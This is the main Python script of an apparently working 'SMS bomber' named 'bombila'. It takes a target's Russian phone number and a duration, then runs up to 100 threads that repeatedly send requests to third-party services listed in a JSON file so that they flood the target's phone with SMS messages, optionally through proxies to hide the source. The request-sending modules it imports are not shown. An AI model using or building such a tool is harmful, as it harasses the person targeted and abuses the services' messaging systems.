#!/usr/bin/env python3

# TODO: PEP8 code style,
#       country codes for other phone numbers,
#       logging ( --verbose )

import os
import json
import argparse
import threading
from itertools import cycle
from time import time, sleep
import conf.config as cfg
from service import Service
from randomData import shuffleServices


def startBomber():
    shuffleServices(services)
    for elem in cycle(services):
        if time() >= args.time:
            return
        sleep(interval)
        service = Service(elem, timeout, proxy)
        service.parse_data()
        service.replace_data(phone)
        try:
            service.send_request()
            print('Success - ' + service.domain_name)
        except KeyboardInterrupt:
            threading._shutdown()



# Creating parser obj
parser = argparse.ArgumentParser(
    description="Ultimate sms bomber - bombila. Russian numbers only",
    prog="bombila", epilog="Usage example: python3 bombila.py -p 79877771122 -t 20")
# Optional args
parser.add_argument(
    "-p", "--phone", metavar="<phone>",
    help="target's russian phone number, format no matters")
parser.add_argument(
    "-t", "--time", metavar="<seconds>",
    type=float, help="bombing time in seconds")
parser.add_argument(
    "--threads", default=100, type=int, metavar="<int>",
    help="threads count, more threads = more sms, (default: %(default)s)")
parser.add_argument(
    "-i", "--interval", default=0, type=float, metavar="<seconds>",
    help="intervals between requests in sec, (default: %(default)s)")
parser.add_argument(
    "-T", "--timeout", default=3, type=float, metavar="<seconds>",
    help="timeout for request in sec, (default: %(default)s)")
parser.add_argument(
    "--proxy", action="store_true", default=None,
    help="use proxy while bombing")
parser.add_argument(
    "-v", "--version", action="version",
    version="%(prog)s " + cfg.__version__)
args = parser.parse_args()

# Targets phone number
phone = args.phone
if not phone:
    phone = input("Enter target's phone number: ")
for trash in ("'", '"', "-", "_", "(", ")", " "):
    if trash in phone:
        phone = phone.replace(trash, "")
if phone[0] == '+':
    phone = phone[1::]
if phone[0] == '8':
    phone = '7' + phone[1::]
if phone[0] == '9':
    phone = '7' + phone

# Bombing time
if not args.time:
    args.time = int(input("Enter bombing time in seconds: "))
# Doesn't creating "time" var because
# it is will conflict with "time" func from module "time"
args.time += time()

# Other args
threads = args.threads
interval = args.interval
timeout = args.timeout
proxy = args.proxy
if proxy:
    proxy = cfg.proxies

with open("services.json", "r") as file:
    services = json.load(file)["services"]

os.system("clear")
print(cfg.banner)

# Creating threads
for thread in range(threads):
    threading.Thread(target=startBomber).start()

# Killing all threads when bombers work is done
threading._shutdown()
print('all done!!!')
